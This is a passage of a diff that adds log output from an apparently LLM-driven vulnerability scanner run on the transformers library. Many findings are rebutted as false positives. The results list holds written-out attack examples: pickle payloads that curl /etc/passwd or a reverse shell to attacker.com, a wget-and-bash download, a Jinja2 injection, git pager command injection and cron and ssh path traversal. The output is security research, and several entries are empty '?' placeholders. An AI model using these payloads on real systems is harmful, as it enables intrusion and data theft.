+engineering). Therefore, the finding is rebutted due to lack of evidence.
+    Evidence: suspicious-189...
+    No code-level evidence patterns.
+  [195/207] suspicious-194 (load_worker_records)
+      6 assumptions (6 violable)
+    Adversary: suspicious-190...
+    ? 10/10 — interesting
+    Assumptions: suspicious-191...
+    ⚠ 10/10 — 1 contradiction(s)
+    Assumptions: suspicious-192...
+    ⚠ 8/10 — 1 contradiction(s)
+    Assumptions: suspicious-193...
+    x rebutted
+      reason: The finding describes a theoretical RCE via pickle deserialization
+in `convert_model` → `load_orig_state_dict` → `torch.load`. However, the actual 
+source code (from 
+`transformers/src/transformers/models/ovis2/convert_ovis2_weights_to_hf.py`) 
+does not expose this function to untrusted user input. The function is a 
+conversion utility intended to be run locally with developer‑controlled file 
+paths. No web endpoint, API route, or external interface passes 
+attacker‑controlled data to `model_name_or_path`. The simulated app controller 
+shown in the evidence is an artificial wrapper not present in the real codebase.
+Without a reachable entry point that allows an attacker to supply a malicious 
+pickle file, the vulnerability is not exploitable in practice. The finding's 
+assumption that input is untrusted is invalid for this code path.
+    Evidence: suspicious-190...
+    No code-level evidence patterns.
+  [196/207] suspicious-195 (save_pretrained)
+    ? 9/10 — interesting
+    Assumptions: suspicious-194...
+      3 assumptions (3 violable)
+    Evidence: suspicious-191...
+    No code-level evidence patterns.
+  [197/207] suspicious-196 (save_pretrained)
+      2 assumptions (2 violable)
+    Adversary: suspicious-193...
+      6 assumptions (5 violable)
+    Adversary: suspicious-192...
+      4 assumptions (4 violable)
+    Evidence: suspicious-194...
+    No code-level evidence patterns.
+  [198/207] suspicious-197 (__call__)
+    x rebutted
+      reason: The finding claims a data flow from `__init__` through 
+`apply_chat_template` to `convert_model`, but the provided source code does not 
+establish any actual call chain linking these functions. `apply_chat_template` 
+(in `tokenization_mistral_common.py`) deals with Jinja template rendering, while
+`convert_model` (in `convert_ovis2_weights_to_hf.py`) is a weight conversion 
+utility. No code snippet shows that `apply_chat_template` ever invokes 
+`convert_model` or that user-controlled data propagates between them. The static
+analysis annotations themselves admit that the engine could not trace variable 
+propagation. The sink `torch.load` inside `load_orig_state_dict` is indeed 
+dangerous, but without evidence that an attacker can control the 
+`model_name_or_path` argument in a production context, the vulnerability is not 
+exploitable. The finding incorrectly assumes that `model_name_or_path` is 
+attacker-controlled; in reality, `convert_model` is likely a private helper 
+called only during library-internal weight conversion, not exposed to external 
+input. Therefore, the reported RCE is not authentically exploitable.
+    Evidence: suspicious-192...
+    No code-level evidence patterns.
+  [199/207] suspicious-198 (_load_voice_preset)
+    x rebutted
+      reason: The finding assumes that `set_shared_dir` receives 
+attacker-controlled input via a simulated web endpoint, but this endpoint is not
+part of the actual library (transformers). The real code in `network_logging.py`
+and `conftest.py` shows that `set_shared_dir` is a method called only from 
+internal test configuration (e.g., `pytest_configure`), where `shared_dir` is 
+set by the test runner, not by an external user. No code path exists that allows
+an attacker to supply the `shared_dir` value. Without attacker control of the 
+input, there is no exploitable path traversal. The sink `dump_worker_records` is
+only reachable via internal calls, and the data flow from untrusted sources is 
+absent. Therefore, the reported vulnerability is not authentically exploitable 
+in any realistic deployment.
+    Evidence: suspicious-193...
+    No code-level evidence patterns.
+  [200/207] suspicious-199 (on_train_begin)
+    ⚠ 9/10 — 1 contradiction(s)
+    Assumptions: suspicious-195...
+    ⚠ 10/10 — 1 contradiction(s)
+    Assumptions: suspicious-196...
+    ⚠ 10/10 — 1 contradiction(s)
+    Assumptions: suspicious-198...
+      5 assumptions (5 violable)
+    Adversary: suspicious-195...
+    ⚠ 10/10 — 1 contradiction(s)
+    Assumptions: suspicious-197...
+    ⚠ 10/10 — 1 contradiction(s)
+    Assumptions: suspicious-199...
+      4 assumptions (4 violable)
+    Adversary: suspicious-196...
+    x rebutted
+      reason: The finding claims a taint path from `convert_model` -> 
+`load_orig_state_dict` -> `torch.load` leading to RCE, but the provided source 
+code does not show the implementation of `load_orig_state_dict` or the body of 
+`convert_model`. The snippets are from unrelated modules (chat_template_utils, 
+quantizers, video_processing_utils) and do not confirm the asserted data flow. 
+The structured evidence relies on 'prior knowledge' rather than the actual code 
+presented, which is insufficient to demonstrate the vulnerability. Without 
+verifying the actual sink call and parameter propagation in the given source, 
+the finding cannot be substantiated.
+    Evidence: suspicious-195...
+    No code-level evidence patterns.
+  [201/207] suspicious-200 (handle_non_exit_user_commands)
+    x rebutted
+      reason: The finding claims a pickle deserialization RCE in `convert_model`
+via `load_orig_state_dict` calling `torch.load()`. However, the provided source 
+code does not include `convert_model`, `load_orig_state_dict`, or any call to 
+`torch.load`. The data flow annotations show unrelated call chains and 
+explicitly state the static engine could not trace variable propagation. Without
+the actual source for the alleged vulnerable functions, the taint path cannot be
+verified. The evidence is entirely based on unsubstantiated assumptions about 
+code not present in the submission. Therefore, the finding is not supported and 
+must be rebutted.
+    Evidence: suspicious-196...
+    No code-level evidence patterns.
+  [202/207] suspicious-201 (_inner_run)
+      6 assumptions (6 violable)
+    Adversary: suspicious-198...
+      4 assumptions (4 violable)
+    Adversary: suspicious-199...
+    x rebutted
+      reason: The finding claims an RCE vulnerability via `torch.load` in 
+`convert_ovis2_weights_to_hf.py`, but the provided source code does not support 
+it. The `convert_model` function shown only contains a docstring and no body, so
+the claimed call to `load_orig_state_dict` and `torch.load` is unverified. The 
+simulated web endpoint wrapper (`@app.post`) points to `__init__` and 
+`_load_voice_preset`, not to `convert_model`. There is no evidence that 
+`convert_model` receives attacker-controlled input in any realistic scenario. 
+The taint path contains a logical jump: `load_orig_state_dict` is not defined in
+the provided code, and the data flow from the entry point to the sink is not 
+traceable. The structured evidence contradicts the actual source snippets. 
+Therefore, the vulnerability is not substantiated and is likely a false 
+positive.
+    Evidence: suspicious-198...
+    No code-level evidence patterns.
+  [203/207] suspicious-202 (init_cb)
+      5 assumptions (5 violable)
+    Adversary: suspicious-197...
+    x rebutted
+      reason: The finding claims Remote Code Execution via `torch.load` in 
+`convert_ovis2_weights_to_hf.py`, but the provided source code snippet does not 
+contain the `load_orig_state_dict` function, any call to `torch.load`, or the 
+actual implementation of `convert_model`. The data flow annotations list a sink 
+at `on_train_begin` (line 351 of `trainer_callback.py`) which is unrelated to 
+pickle deserialization. The structured evidence's taint path (`convert_model → 
+load_orig_state_dict → torch.load`) is entirely unsupported by the included 
+code—neither `load_orig_state_dict` nor `torch.load` appear anywhere. Moreover, 
+the source code is a fragmented mix of unrelated files (chat_template_utils, 
+quantizer_vptq, video_processing_utils, etc.), making it impossible to verify 
+the claimed vulnerability. The finding is based on assumptions about code not 
+present in the provided material. Per the evaluation guidelines, the lack of 
+actual source code matching the vulnerability description warrants a rebuttal.
+    Evidence: suspicious-199...
+    No code-level evidence patterns.
+  [204/207] suspicious-203 (init_cb)
+    x rebutted
+      reason: The finding relies on an artificially constructed web endpoint 
+wrapper that is not part of the actual library. The source code shows 
+`convert_model` in a standalone conversion script 
+(`convert_ovis2_weights_to_hf.py`), which is intended to be run locally by a 
+developer with a trusted model path. There is no evidence of any external-facing
+API that passes attacker-controlled input to `convert_model` or `torch.load`. 
+The taint path from `__init__` (which in the provided code is a logging setup in
+`modular_model_detector.py`) to the sink is fabricated and does not reflect real
+usage. The `[STRUCTURED_EVIDENCE]` taint path includes steps like 
+`__init__→convert_model→load_orig_state_dict→torch.load`, but the actual call 
+chain from `__init__` in `modular_model_detector.py` to `convert_model` is not 
+demonstrated in the source code, and the wrapper is a simulation not present in 
+the target project. Therefore, the reported RCE vulnerability is not 
+authentically exploitable in the context of the library as it is actually used.
+    Evidence: suspicious-197...
+    No code-level evidence patterns.
+  [205/207] suspicious-204 (save_results)
+    ⚠ 10/10 — 1 contradiction(s)
+    Assumptions: suspicious-200...
+    ⚠ 10/10 — 1 contradiction(s)
+    Assumptions: suspicious-201...
+      4 assumptions (4 violable)
+    Adversary: suspicious-200...
+    ⚠ 10/10 — 1 contradiction(s)
+    Assumptions: suspicious-202...
+    x rebutted
+      reason: The finding claims an RCE vulnerability via pickle deserialization
+in `convert_model` within `convert_ovis2_weights_to_hf.py`, but the provided 
+source code (the only code block) does **not** contain the actual implementation
+of `convert_model` or `load_orig_state_dict`. The cited call chain shows only a 
+docstring snippet and unrelated code from other files. The structured evidence 
+relies on "prior knowledge from other analysis paths" that is not present in the
+supplied source. Without the actual function body, we cannot verify that 
+`torch.load` is called with untrusted input, nor that the taint path is real. 
+The finding is therefore unsupported by the evidence given and must be rebutted.
+    Evidence: suspicious-200...
+    No code-level evidence patterns.
+  [206/207] suspicious-205 (apply_chat_template)
+      6 assumptions (6 violable)
+    Adversary: suspicious-201...
+    ⚠ 9/10 — 1 contradiction(s)
+    Assumptions: suspicious-204...
+    ⚠ 10/10 — 1 contradiction(s)
+    Assumptions: suspicious-203...
+    x rebutted
+      reason: The finding lacks direct evidence for the claimed taint path. The 
+provided source code snippet does not contain the bodies of `convert_model` or 
+`load_orig_state_dict`; only unrelated call chains are shown. The static 
+analysis annotations explicitly note that variable propagation could not be 
+traced and that the source code must be analyzed semantically. The structured 
+evidence relies on "prior knowledge" rather than on the supplied source lines. 
+Moreover, the function `convert_model` is a weight conversion utility intended 
+for internal use by developers, not exposed to untrusted user input. The 
+simulated web endpoint is an artificial wrapper not part of the actual library, 
+so the attack scenario is unrealistic. Without concrete source-code proof that 
+`model_name_or_path` reaches `torch.load`, the finding is not substantiated and 
+is therefore rebutted.
+    Evidence: suspicious-201...
+    No code-level evidence patterns.
+  [207/207] suspicious-206 (summarize)
+      2 assumptions (2 violable)
+    Adversary: suspicious-202...
+    x rebutted
+      reason: The finding is not supported by the provided source code. The 
+alleged data flow trace from `__init__` to `torch.load` jumps between unrelated 
+files (e.g., `modular_model_detector.py`, `chat_template_utils.py`, 
+`quantizer_vptq.py`, etc.) without any actual call chain linking them. The only 
+snippet of `convert_model` shown is its docstring; the critical implementation 
+(calling `load_orig_state_dict` which calls `torch.load`) is absent from the 
+evidence. Moreover, the entry point `__init__` and the system wrapper are 
+simulated, not actual code. Without concrete source lines demonstrating that 
+untrusted input reaches `torch.load`, the claimed RCE is unsubstantiated. The 
+finding is therefore rebutted.
+    Evidence: suspicious-202...
+    No code-level evidence patterns.
+    ⚠ 9/10 — 1 contradiction(s)
+    Assumptions: suspicious-205...
+      2 assumptions (2 violable)
+    Adversary: suspicious-203...
+      no assumptions extracted
+    Adversary: suspicious-204...
+    x rebutted
+      reason: The reported taint path contains multiple logical jumps that make 
+the claimed data flow implausible. The chain starts from `init_cb` (a CLI 
+serving utility) and passes through unrelated functions like 
+`_cached_compile_jinja_template`, `_get_template_variables`, and 
+`apply_chat_template` – none of which have any connection to model weight 
+conversion. The final sink `convert_model` is a one-off conversion script 
+(`convert_ovis2_weights_to_hf.py`) that is not part of any web-facing request 
+handler. Even in the simulated wrapper, there is no evidence that 
+`model_name_or_path` in `convert_model` originates from untrusted HTTP input; 
+the static trace appears to have conflated separate call chains. Additionally, 
+the finding assumes remote reachability without demonstrating that an attacker 
+can control the parameter in a realistic deployment. Without a coherent data 
+flow, the `torch.load` sink is not reachable from the entry point. The finding 
+is therefore not exploitable as described.
+    Evidence: suspicious-203...
+    No code-level evidence patterns.
+    x rebutted
+      reason: The finding identifies a genuine pickle deserialization risk in 
+`torch.load()`, but the exploitability scenario is unrealistic. The function 
+`convert_model` is a local conversion script (see 
+`convert_ovis2_weights_to_hf.py`), not a network-accessible endpoint. The 
+simulated web wrapper in the evidence is artificial; the actual library does not
+expose `convert_model` to untrusted remote input. An attacker would need local 
+access or control over the script's arguments to supply a malicious pickle file.
+This is a local privilege escalation or supply-chain issue, not a remote code 
+execution vulnerability in the library. No validation is missing because the 
+function is designed to be used with trusted model files. The finding's taint 
+path relies on a hypothetical deployment that does not exist in the source code.
+Therefore, the vulnerability is not authentically exploitable in real-world 
+contexts.
+    Evidence: suspicious-204...
+    No code-level evidence patterns.
+    ⚠ 8/10 — 2 contradiction(s)
+    Assumptions: suspicious-206...
+      4 assumptions (4 violable)
+    Adversary: suspicious-205...
+      4 assumptions (4 violable)
+    path bridge: 1 builder + 1 consumer
+    Adversary: suspicious-206...
+    not rebutted
+      weak point: The code directly constructs file:// URIs from 
+attacker-controlled paths via `Path(maybe_path).resolve().as_uri()` without any 
+validation, and calls `load_audio_as(maybe_path, ...)` to read arbitrary local 
+files. The developer explicitly marks the function as dangerous and relies on 
+nonexistent downstream checks. The `apply_chat_template` method is a public API 
+reachable from external input (e.g., a chat completion endpoint), making the LFI
+exploitable in realistic deployments. No sanitization, whitelist, or restriction
+to a base directory exists, and the downstream mistral-common library treats the
+resulting file URIs as trusted file reads.
+    PoC Agent: suspicious-205...
+Slice suspicious-205 failed: '"success"'
+    Error: suspicious-205: '"success"'
+    not rebutted
+      weak point: The finding is based on pattern evidence and missing LLM 
+analysis, but the source code clearly shows `report_path` is an 
+attacker-controlled parameter in a public API function. The sink 
+`Path(report_path)` followed by `p.read_text()` allows arbitrary file read if 
+the function is exposed to untrusted input. The simulated web endpoint wrapper 
+confirms a realistic exploit scenario. No sanitization or access control 
+prevents path traversal. Despite the static analysis flaws, the vulnerability is
+genuine.
+    PoC Agent: suspicious-206...
+Slice suspicious-206 failed: '"success"'
+    Error: suspicious-206: '"success"'
+
+Phase D.5: Assumption Cross-Correlation
+  Assumptions collected: 818 (805 violable)
+
+Phase E: Results
+  Blackboard: 192 cached intents, 2142 knowledge entries, 207 phase results
+  High confidence (87):
+    rce-002: torch.load (or pickle.loads) inside load_orig_state_dict — 
+logic_gap
+      An attacker provides a crafted `.bin` file (pickle) that executes a 
+reverse shell when loaded via `torch.load`. The attacker controls 
+`model_name_or_path` (e.g., via a web endpoint that accepts model paths) 
+pointing to this malicious file, e.g., `/tmp/malicious_model/pytorch_model.bin`.
+The function `load_orig_state_dict` opens and unpickles the file, triggering 
+code execution.
+    rce-005: subprocess.run — logic_gap
+      Supply `commit_sha` as `-c core.pager='echo pwned;id' -s --format=%ct 
+HEAD` to execute `id` command via the Git pager mechanism.
+    rce-011: ? — ?
+      
+    rce-012: ? — ?
+      
+    rce-013: ? — ?
+      
+    rce-014: ? — ?
+      
+    rce-016: ? — ?
+      
+    rce-018: ? — ?
+      
+    rce-020: torch.load (via load_orig_state_dict) — logic_gap
+      Attacker provides a malicious `.pt` file containing a pickled payload 
+(e.g., `__reduce__` returning `os.system` or `subprocess.check_output`) via the 
+`model_name_or_path` parameter to `convert_model`. Upon `torch.load()`, the 
+payload executes, achieving remote code execution.
+    rce-022: torch.load (via load_orig_state_dict) and/or jinja2 Template.render
+(via apply_chat_template) — logic_gap
+      For the pickle RCE: supply a malicious `model_name_or_path` pointing to a 
+crafted PyTorch checkpoint file that executes arbitrary code via `__reduce__`. 
+For SSTI: inject Jinja2 template expression `{{ 
+config.__class__.__init__.__globals__['os'].popen('cmd').read() }}` into the 
+chat template string.
+    rce-023: torch.load (via load_orig_state_dict) — logic_gap
+      Provide a crafted .bin or .pt file containing a malicious pickle payload. 
+When the application calls convert_model with a URL or path pointing to that 
+file, torch.load will execute the payload, granting arbitrary remote code 
+execution.
+    rce-024: torch.load — logic_gap
+      Provide a path to a malicious pickle file (e.g., a Hugging Face model repo
+with a crafted .bin or .pt file) as `model_name_or_path`. The `torch.load` call 
+will deserialize it and execute arbitrary code.
+    rce-025: torch.load — logic_gap
+      An attacker can supply a path to a malicious pickle file (e.g., through a 
+model download or direct file upload) that contains a payload executing 
+arbitrary code when torch.load is called.
+    rce-027: ? — rce
+      
+    rce-029: torch.load — logic_gap
+      Create a malicious pickle file containing a payload via __reduce__ (e.g., 
+a reverse shell command). Place it at a location the attacker controls (e.g., a 
+public URL or local path). Pass the path as `model_name_or_path` to the 
+conversion entry point. The pickle will be deserialized and the payload 
+executed.
+    rce-031: torch.load — logic_gap
+      
+    rce-032: ? — ?
+      
+    rce-033: torch.load — logic_gap
+      Provide a malicious PyTorch checkpoint file (e.g., via file upload or 
+network share) containing a pickled object with a `__reduce__` method that 
+executes a command. Example: `python -c 'import os; os.system("id > 
+/tmp/pwned")'` embedded in the pickle stream.
+    rce-034: torch.load — logic_gap
+      Attackers can provide a `model_name_or_path` pointing to a crafted pickle 
+file (e.g., via a network share or local file upload) that executes arbitrary 
+Python code upon `torch.load`. Example: a pickle file that runs `os.system('curl
+attacker.com/$(cat /etc/passwd)')`.
+    rce-035: torch.load — logic_gap
+      1. Attacker crafts a malicious Pickle file (e.g., using `pickle` to embed 
+a reverse shell command). 2. Hosts the file at a URL or local path. 3. Calls 
+`convert_model(model_name_or_path='http://attacker.com/evil.pkl')` or a file 
+path. 4. `torch.load` deserializes the pickle, executing the arbitrary code, 
+granting RCE.
+    rce-037: ? — missing_spec
+      
+    rce-038: torch.load — logic_gap
+      Prepare a malicious PyTorch checkpoint file (e.g., using `__reduce__` to 
+execute a reverse shell) and host it at a URL. Call 
+`convert_model('http://attacker.com/malicious.pt', save_dir='/tmp/out')`. The 
+library will download and deserialize the file, executing the payload.
+    rce-042: torch.load — logic_gap
+      An attacker can craft a malicious `.bin` or `.pt` file containing a pickle
+payload (e.g., via `__reduce__` to execute `os.system('curl 
+attacker.com/revshell | sh')`). Pointing `model_name_or_path` to this file (or a
+network path) triggers code execution on the server.
+    rce-043: ? — rce_via_pickle
+      
+    rce-044: _load_processor — logic_gap
+      For the `trust_remote_code` vector: set `trust_remote_code=True` and 
+provide a malicious `model_id` that contains a `processor_config.json` 
+referencing a remote code file with an `__init__.py` that executes arbitrary 
+commands (e.g., `__import__('os').system('id > /tmp/pwned')`). For the 
+`torch.load` vector: supply a pickled payload via `model_name_or_path` that 
+executes code in `__reduce__`.
+    rce-045: torch.load — logic_gap
+      An attacker provides a `model_name_or_path` pointing to a malicious pickle
+file (e.g., via an HTTP upload or a remote URL if the library supports it). The 
+malicious file contains an object whose `__reduce__` method executes arbitrary 
+commands (e.g., `os.system('curl attacker.com/$(id)')`). When `torch.load` is 
+called, the payload executes in the context of the loaded process.
+    rce-046: torch.load — logic_gap
+      An attacker can craft a malicious `.pth` or `.bin` file containing a 
+pickle payload (e.g., via `__reduce__`) and supply its path as the 
+`model_name_or_path` parameter. When `convert_model` is invoked (e.g., through 
+`from_pretrained` or a conversion script), `torch.load` will execute the 
+payload, giving the attacker arbitrary code execution on the host.
+    ssrf-081: ? — ?
+      
+    ssrf-082: ? — ?
+      
+    ssrf-083: ? — ?
+      
+    ssrf-093: ? — ?
+      
+    ssrf-097: ? — ?
+      
+    ssrf-098: ? — ?
+      
+    ssrf-099: ? — ?
+      
+    ssrf-100: ? — ?
+      
+    sqli-104: ? — ?
+      
+    sqli-105: ? — ?
+      
+    sqli-108: ? — ?
+      
+    sqli-109: ? — ?
+      
+    sqli-110: ? — ?
+      
+    afo-128: ? — ?
+      
+    redos-134: ? — ?
+      
+    redos-137: ? — ?
+      
+    redos-141: ? — ?
+      
+    redos-142: ? — ?
+      
+    redos-144: ? — ?
+      
+    redos-145: ? — ?
+      
+    redos-147: ? — ?
+      
+    redos-149: ? — ?
+      
+    redos-153: ? — ?
+      
+    suspicious-169: importlib.import_module — logic_gap
+      If the application runs on a server where an attacker can upload a 
+malicious `.py` file (e.g., to `/tmp/evil.py`), they could set `test_file` to a 
+path like `../../tmp/evil` such that `get_module_path` produces a module name 
+that `importlib.import_module` can resolve to that file. Alternatively, if the 
+import system allows `..` to traverse directories, the attacker could point to 
+any Python file in the filesystem (e.g., `../../some_sensitive_module`). The 
+exact exploit depends on `get_module_path` logic, but the lack of any 
+restrictions makes arbitrary module import likely.
+    suspicious-179: get_all_errors — logic_gap
+      If the library's public API exposes an `artifact_dir` parameter that is 
+passed to `get_all_errors`, an attacker can supply `artifact_dir=/tmp/malicious`
+and place a crafted zip file (or a symlink to `/etc/passwd`) in that directory. 
+The function will list the directory, find the zip file, and process it, 
+potentially leaking sensitive data if `get_errors_from_single_artifact` reads 
+file contents.  If the attacker can control the directory content (e.g., by 
+uploading a zip), they can also exploit the TOCTOU window by swapping a file 
+after listing but before opening, directing the open to an arbitrary path.
+    suspicious-183: convert_model — logic_gap
+      An attacker provides a malicious file path (e.g., a crafted .pt file 
+hosted on an attacker-controlled server or a local file with pickle payload). 
+The `convert_model` function calls `load_orig_state_dict(path)`, which does 
+`torch.load(path)`. The pickle payload runs arbitrary Python code, achieving 
+RCE.
+    suspicious-185: load_orig_state_dict → torch.load — logic_gap
+      An attacker could provide a `model_name_or_path` value pointing to a 
+malicious pickle file (e.g., via a path like `/tmp/evil.pth` or a URL if the 
+code allows remote loading). The pickle file would contain a payload that 
+executes arbitrary Python code, giving the attacker full control. For example, 
+using a pickle payload that spawns a reverse shell or exfiltrates data when 
+`torch.load` is called.
+    suspicious-186: convert_model — logic_gap
+      An attacker can supply a path to a malicious PyTorch checkpoint file 
+(e.g., via the `model_name_or_path` argument when calling `convert_model`). This
+file contains a pickle payload that executes arbitrary commands on the server 
+when loaded by `torch.load`. For example, a crafted `.bin` or `.pt` file with a 
+`__reduce__` method can spawn a reverse shell or exfiltrate data.
+    suspicious-188: torch.load — logic_gap
+      An attacker provides a crafted PyTorch model file (e.g., `/tmp/evil.pt`) 
+as `model_name_or_path` to the `convert_model` function. This file contains a 
+pickle payload that executes arbitrary commands when loaded via `torch.load`. 
+The attacker can achieve remote code execution on the server running the 
+conversion script.
+    suspicious-189: torch.load — logic_gap
+      An attacker crafts a malicious pickle file and provides its path (or a URL
+that points to it) as the `model_name_or_path` argument to `convert_model`. The 
+file contains a `__reduce__` payload that executes a system command. When 
+`torch.load` deserializes the file, the command runs on the server, achieving 
+remote code execution.
+    suspicious-190: torch.load — logic_gap
+      An attacker submits a request to the web endpoint with 
+`model_name_or_path` set to a URL pointing to a crafted pickle file. The server 
+downloads the file (via torch.hub or direct path) and `torch.load` deserializes 
+it, executing code like `__import__('os').system('curl 
+attacker.com/exfil?data=$(cat /etc/passwd)')`. Alternatively, the attacker 
+provides a local path to a pickle file they uploaded earlier, achieving the same
+effect.
+    suspicious-192: convert_model — logic_gap
+      Attacker provides a malicious pickle file path as `model_name_or_path` 
+(e.g., a remote URL or a local file they control) to a service that exposes 
+`convert_model`. The pickle payload executes arbitrary commands on the server.
+    suspicious-193: dump_worker_records — logic_gap
+      An attacker sends a request that triggers 
+`set_shared_dir('/tmp/../../../etc/cron.d')`. When `dump_worker_records` is 
+later called, it creates a file like `/tmp/../../../etc/cron.d/worker_0.json`, 
+which resolves to `/etc/cron.d/worker_0.json`. If the process writes 
+attacker-influenced content (e.g., from `self._records`), this could lead to 
+code execution via cron. Alternatively, set `shared_dir` to `~/.ssh/` to 
+overwrite `authorized_keys` if the filename matches. The exact filename depends 
+on the library's implementation, but the directory traversal through the base 
+directory is the critical flaw.
+    suspicious-195: torch.load — logic_gap
+      An attacker controls the `model_name_or_path` parameter (e.g., via a web 
+API that triggers model conversion). By pointing this parameter to a malicious 
+pickle file (e.g., `/tmp/evil.pth`) created with `__reduce__`, the attacker 
+achieves remote code execution. Example: 
+`convert_model(model_name_or_path='/tmp/evil.pth', save_dir='/safe/output')` 
+triggers `torch.load('/tmp/evil.pth')` which executes arbitrary code.
+    suspicious-196: torch.load — logic_gap
+      An attacker provides a path to a crafted pickle file (e.g., 
+`/tmp/exploit.pt`) as the `model_name_or_path` parameter. This file contains a 
+malicious pickled object that executes arbitrary commands when deserialized by 
+`torch.load`. The attacker can achieve full code execution on the machine 
+running the library.
+    suspicious-197: convert_model — logic_gap
+      An attacker can craft a malicious pickle file hosted at a controlled path 
+(e.g., `http://attacker.com/evil.pt` or a local path containing a pickle 
+payload). By providing this URL or path as the `model_name_or_path` parameter to
+`convert_model`, the `torch.load` call will deserialize the pickle and execute 
+arbitrary system commands embedded in the pickle payload.
+    suspicious-198: torch.load — logic_gap
+      An attacker controls the `model_name_or_path` parameter (e.g., via a web 
+API or a configuration file). The attacker uploads a malicious pickle file to a 
+location accessible by the application (e.g., a network share, object store, or 
+local path). The file contains a crafted pickle payload that executes arbitrary 
+shell commands (e.g., using `os.system` or `__reduce__`). The attacker then 
+triggers `convert_model` with `model_name_or_path` pointing to that file. 
+`torch.load` deserializes the pickle, executing the attacker's code, leading to 
+full remote code execution.
+    suspicious-199: convert_model — logic_gap
+      Supply a malicious pickle file at the `model_name_or_path` location (e.g.,
+a URL pointing to an attacker-controlled file or a local path after path 
+traversal). The pickle payload will be executed when `torch.load` is called. 
+Example: `convert_model('http://attacker.com/evil.pth', './save_dir')` or 
+`convert_model('../../tmp/evil.pth', './save_dir')` if the attacker can place a 
+file.
+    suspicious-200: torch.load — logic_gap
+      An attacker can craft a malicious .pth or .bin file containing a pickle 
+payload that executes arbitrary Python code. By providing the path to this file 
+as the model_name_or_path parameter to convert_model (or any public entry point 
+that calls it), the payload will be deserialized and executed upon torch.load().
+    suspicious-201: convert_model — logic_gap
+      An attacker provides a path to a malicious pickle file (e.g., via a 
+symlink to a crafted checkpoint). When `convert_model` is called with this path,
+`torch.load` deserializes the pickle and executes arbitrary code. Example: 
+`convert_model(model_name_or_path="/tmp/evil.pt", save_dir="/tmp/output")` where
+`evil.pt` contains a pickle payload that runs `os.system('curl 
+attacker.com/steal')`.
+    suspicious-202: torch.load — logic_gap
+      An attacker provides a path to a malicious pickle file (e.g., crafted with
+'pickle' that executes system commands). The path can be local (e.g., 
+'/tmp/evil.pth') or a remote URL if the code resolves it (though not shown 
+directly, 'torch.load' may accept URLs). The attacker-controlled input flows 
+from the simulated endpoint (untrusted_user_input) through __init__ to 
+convert_model, where the file is deserialized and arbitrary code runs in the 
+server context.
+    suspicious-203: convert_model — logic_gap
+      An attacker provides a path to a malicious pickle file (e.g., via the 
+`model_name_or_path` parameter in a crafted request). When `convert_model` loads
+this file, `torch.load` deserializes the pickle data, executing arbitrary code 
+within the context of the application. Example: 
+`convert_model(model_name_or_path='http://attacker.com/malicious.pt')` or 
+`convert_model(model_name_or_path='/tmp/evil.pkl')` where the file contains a 
+pickle payload like `os.system('curl attacker.com/$(cat /etc/passwd)')`.
+    suspicious-204: torch.load — logic_gap
+      An attacker provides `model_name_or_path` pointing to a crafted pickle 
+file (e.g., on an HTTP server or a network share). The file is loaded by 
+`torch.load`, which executes arbitrary Python code embedded in the pickle. 
+Example: attacker hosts `malicious.pth` that executes `os.system('wget -O 
+/tmp/shell.sh http://attacker/shell.sh && bash /tmp/shell.sh')` and passes the 
+URL as `model_name_or_path`.
+
+Pipeline Complete
+  Target: /tmp/transformers_src
+  Model: claude-sonnet-4-6
+  Duration: 4102.7s
+  Paths discovered: 207
+  Slices analyzed: 207
+  Findings: 87 high, 90 interesting
+  Tokens: 7,085,185 total (5,258,313 prompt + 1,826,872 completion)
+
+  Recommended verification targets:
+    RCE rce-002: Code-level pattern evidence (7 matches): ?:self.model = 
+AutoModel.from_pretrained(EMBEDDING_MODEL, t
+    RCE rce-005: Code-level pattern evidence (7 matches): ?:result = 
+subprocess.run(; ?:- **Unsafe Deserialization (p
+    RCE rce-011: Code-level pattern evidence (7 matches): ?:commit_hash = 
+subprocess.check_output(["git", "rev-parse"
+    RCE rce-012: Code-level pattern evidence (6 matches): ?:- **Unsafe 
+Deserialization (pickle/joblib/shelve/marshal)
+    RCE rce-013: Code-level pattern evidence (8 matches): ?:fork_point_sha = 
+subprocess.check_output("git merge-base 
+
+v3 CodeQL pipeline complete.
